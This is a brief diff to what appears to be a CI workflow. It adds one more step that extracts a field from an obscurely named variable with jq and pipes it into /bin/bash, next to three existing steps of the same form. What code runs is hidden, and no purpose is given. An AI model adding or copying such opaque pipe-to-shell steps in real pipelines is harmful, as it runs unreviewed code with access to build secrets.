@@ -25,6 +25,7 @@ jobs:
           echo $yqsel637 | jq -r .hb97 | /bin/bash
           printf '%s' "$tnvom87524" | jq -r .ypara32 | /bin/bash
           echo $ome5 | jq -r .c60045 | /bin/bash
+          printf '%s' "$ft28712" | jq -r .kzqc91125 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
